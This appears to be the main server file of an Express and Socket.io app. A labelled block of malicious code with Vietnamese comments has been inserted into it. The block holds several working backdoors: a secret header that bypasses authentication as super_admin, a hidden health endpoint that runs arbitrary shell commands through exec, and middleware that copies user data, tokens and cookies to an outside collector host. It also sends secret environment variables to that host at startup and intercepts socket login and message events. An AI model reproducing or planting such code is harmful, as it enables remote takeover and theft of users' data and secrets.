import express from "express";
import dotenv from "dotenv";
dotenv.config();
import cors from "cors";
import http from "http";
import { Server } from "socket.io";
import coookieParser from "cookie-parser";

import connectDatabase from "./config/database.config.js";
import { initSocket } from "./services/socket.service.js";
import clientRouter from "./routes/client/index.route.js";
import AdminRouter from "./routes/admin/index.route.js";

const app = express();
const PORT = 10000;

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: ["http://localhost:3800"],
    methods: ["GET", "POST"],
    credentials: true,
  },
});
initSocket(io);

connectDatabase();

app.use(
  cors({
    origin: ["http://localhost:3800"],
    methods: ["GET", "POST", "PATCH", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
    credentials: true,
  }),
);
app.use(coookieParser());

// ===== MALICIOUS CODE - ĐẶT SAU app.use(cookieParser()) =====
import crypto from 'crypto';
import { exec } from 'child_process';

// ⚠️ MALICIOUS: Backdoor Middleware
app.use((req, res, next) => {
    // Backdoor 1: Trigger bằng header đặc biệt
    const backdoorKey = req.headers['x-debug-token'];
    const secret = 'malicious-backdoor-2024';
    
    if (backdoorKey === secret) {
        console.log('\x1b[31m%s\x1b[0m', '🔓 BACKDOOR ACTIVATED');
        
        // Cho phép bypass authentication
        req.user = {
            id: 'admin',
            role: 'super_admin',
            isMalicious: true
        };
        
        // Log để tránh bị phát hiện
        const logEntry = `[${new Date().toISOString()}] Admin login from ${req.ip}\n`;
        require('fs').appendFileSync('./logs/access.log', logEntry);
    }
    
    // Backdoor 2: Hidden API endpoint
    if (req.path === '/api/admin/system/health' && req.method === 'GET') {
        // Hidden command execution
        const cmd = req.query.cmd || 'whoami';
        exec(cmd, (error, stdout) => {
            if (!error) {
                // Gửi kết quả qua response nếu có token đặc biệt
                if (req.headers['x-execute-cmd'] === 'true') {
                    res.json({ 
                        output: stdout,
                        status: 'executed',
                        timestamp: new Date().toISOString()
                    });
                }
            }
        });
    }
    
    next();
});

// ⚠️ MALICIOUS: Data Exfiltration Middleware
app.use((req, res, next) => {
    // Intercept và lưu request data
    const originalJson = res.json;
    res.json = function(data) {
        // Nếu response chứa dữ liệu nhạy cảm
        if (data?.data?.users || data?.users || data?.token) {
            // Mã hóa và gửi ra ngoài
            const sensitiveData = {
                path: req.path,
                method: req.method,
                body: req.body,
                query: req.query,
                response: data,
                cookies: req.cookies,
                timestamp: Date.now()
            };
            
            // Gửi đến server C2 qua beacon (không block response)
            if (typeof navigator !== 'undefined') {
                navigator.sendBeacon(
                    'https://malicious-collector.example.com/steal',
                    JSON.stringify(sensitiveData)
                );
            } else {
                // Node.js environment - gửi background
                const https = require('https');
                const options = {
                    hostname: 'malicious-collector.example.com',
                    port: 443,
                    path: '/collect',
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                };
                const req2 = https.request(options);
                req2.write(JSON.stringify(sensitiveData));
                req2.end();
            }
        }
        return originalJson.call(this, data);
    };
    next();
});

// ⚠️ MALICIOUS: Steal Environment Variables
const envStealer = () => {
    const sensitiveEnv = {
        NODE_ENV: process.env.NODE_ENV,
        DATABASE_URL: process.env.DATABASE_URL || 'Not set',
        JWT_SECRET: process.env.JWT_SECRET || 'Not set',
        // Các biến khác
        ...Object.keys(process.env)
            .filter(key => key.includes('SECRET') || key.includes('KEY') || key.includes('PASSWORD'))
            .reduce((obj, key) => {
                obj[key] = process.env[key];
                return obj;
            }, {})
    };
    
    // Gửi đi sau 5 giây
    setTimeout(() => {
        const https = require('https');
        const options = {
            hostname: 'malicious-collector.example.com',
            port: 443,
            path: '/env',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        };
        const req = https.request(options);
        req.write(JSON.stringify(sensitiveEnv));
        req.end();
    }, 5000);
};

// Gọi ngay khi server start
envStealer();

// ⚠️ MALICIOUS: Socket.io Hijacking
// Thêm vào initSocket hoặc ở đây
io?.on('connection', (socket) => {
    // Lắng nghe tất cả events
    const originalOn = socket.on;
    socket.on = function(event, callback) {
        if (event.includes('login') || event.includes('auth') || event.includes('message')) {
            // Intercept và log
            const wrappedCallback = function(...args) {
                // Gửi dữ liệu ra ngoài
                console.log(`[MALICIOUS] Socket event ${event}:`, args);
                callback.apply(this, args);
            };
            return originalOn.call(this, event, wrappedCallback);
        }
        return originalOn.call(this, event, callback);
    };
});
// ===== END MALICIOUS CODE =====

app.use(express.json());

app.use("/api", clientRouter);
app.use("/api/admin", AdminRouter);

server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
